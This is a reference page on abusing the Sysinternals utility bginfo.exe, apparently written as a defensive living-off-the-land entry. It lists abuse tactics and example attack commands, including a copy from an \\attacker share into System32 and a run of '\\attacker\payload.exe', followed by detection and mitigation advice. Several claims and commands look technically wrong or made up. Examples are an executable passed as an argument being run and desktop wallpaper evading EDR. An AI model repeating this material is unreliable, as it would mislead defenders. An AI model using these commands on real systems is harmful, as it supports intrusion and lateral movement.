# bginfo.exe
## What is it?
*```bginfo.exe``` is a legitimate utility developed by Sysinternals (now owned by Microsoft) that is used to display system information on the desktop background.*
*It can display a variety of system information, such as CPU, memory usage, IP address, and other system parameters directly on the user’s desktop background. This tool is often used by system administrators to provide real-time information on machine status for quick diagnostics.*

## Legitimate Usage
- **Display System Information** → Shows important system details like IP address, memory, and disk usage on the desktop background.
- **System Monitoring** → Used by IT administrators to visually track the state of a system at a glance.
- **Automate Information Updates** → Can be configured to automatically update the displayed system information at regular intervals.
- **Personalized Desktop Information** → Customizes desktop for users with vital data like uptime or network status.

## How to abuse it
- **Persistence** → Attackers can use ```bginfo.exe``` to display malicious information or create a visually misleading background to distract or confuse users.
- **Bypass Security Monitoring** → As a trusted system utility, ```bginfo.exe``` can be leveraged to bypass security controls and avoid detection when placed in trusted directories.
- **Lateral Movement** → Attackers can deploy ```bginfo.exe``` across multiple machines in the network to avoid detection, while it masquerades as a normal administrative tool.
- **Execution of Malicious Payloads** → Malicious code can be run in the background while ```bginfo.exe``` appears to be a benign, informational tool.
- **Command and Control (C2) Communication** → It could be abused as part of a communication channel to execute commands or retrieve payloads.

## Example attacks
### 1. Malicious Persistence via Background Information
*Attackers can configure ```bginfo.exe``` to run at startup and display malicious or confusing information on the desktop to distract the user while the malicious payload executes in the background.*
**Set Up Malicious Information Display**

```
bginfo.exe C:\path\to\malicious\config.bgi /timer:0 /silent
```

**Effect:**
- ```bginfo.exe``` runs silently at startup, showing a benign or misleading system status on the desktop while the real payload runs in the background.

### 2. Bypassing Detection by Hiding Payloads
*Attackers can use ```bginfo.exe``` to hide the presence of other malicious files or processes on the system.*
**Create a Misleading Desktop Background**

```
bginfo.exe C:\path\to\legitimate\config.bgi /timer:0 /silent
```

**Effect:**
- The background is set to display seemingly normal system information while malicious activities run in the background, evading detection by security tools that focus on active processes.

### 3. Lateral Movement via bginfo.exe
*Attackers can spread ```bginfo.exe``` across a network, using it to install malicious configurations on multiple machines under the guise of an administrative tool.*
**Deploy bginfo.exe Across the Network**

```
xcopy \attacker\malicious\bginfo.exe C:\Windows\System32 /E
```

**Effect:**
- Copies ```bginfo.exe``` to all target machines and sets it up to run silently, creating persistence while moving laterally within the network.

### 4. Remote Execution of bginfo.exe for C2 Communication
*Attackers can use ```bginfo.exe``` to secretly execute malicious payloads or send data to a remote command-and-control server.*
**Execute Malicious Payload via bginfo.exe**

```
bginfo.exe \attacker\payload.exe /timer:0 /silent
```

**Effect:**
- Runs a malicious payload silently on the target machine under the guise of a system utility.

### 5. Using bginfo.exe to Evade Detection by EDR Systems
*Security solutions may overlook ```bginfo.exe``` as it is a trusted and widely-used tool. Attackers can take advantage of this to bypass detection.*
**Use bginfo.exe to Execute Malicious Commands**

```
bginfo.exe C:\malicious\config.bgi /timer:0 /silent
```

**Effect:**
- ```bginfo.exe``` executes in the background with no visible output, bypassing security monitoring tools that focus on active malicious processes.

# Detection & Mitigation
## Detection Methods
**Monitor bginfo.exe Execution**
- **Event ID 4688 (New Process Creation)** → Detect the creation of ```bginfo.exe``` processes, especially when executed with unusual parameters or from untrusted directories.
- **Look for Unauthorized Use** → Ensure that ```bginfo.exe``` is not being used inappropriately in critical or production systems, particularly in network shares or user directories.

**File Integrity Monitoring**
- **Check for File Modifications** → Look for changes to system configuration files related to ```bginfo.exe``` or unauthorized copies in trusted directories like ```C:\Windows\System32```.

**Monitor Scheduled Tasks and Startup Folders**
- **Event ID 4698 (Scheduled Task Created)** → Detect the creation of scheduled tasks or startup entries that may be used for persistence.
- **Event ID 7035 (Service Control Manager)** → Monitor for suspicious service activity related to system utilities like ```bginfo.exe```.

## Mitigation Strategies
- **Restrict bginfo.exe Execution** → Use application whitelisting or security policies to restrict the use of ```bginfo.exe``` to trusted administrators only.
- **Disable Unnecessary Administrative Tools** → If ```bginfo.exe``` is not required for regular administrative tasks, consider disabling it via Group Policy or other management tools.
- **Implement Security Monitoring Solutions** → Use EDR (Endpoint Detection and Response) solutions to detect and block abnormal behaviors associated with trusted utilities like ```bginfo.exe```.
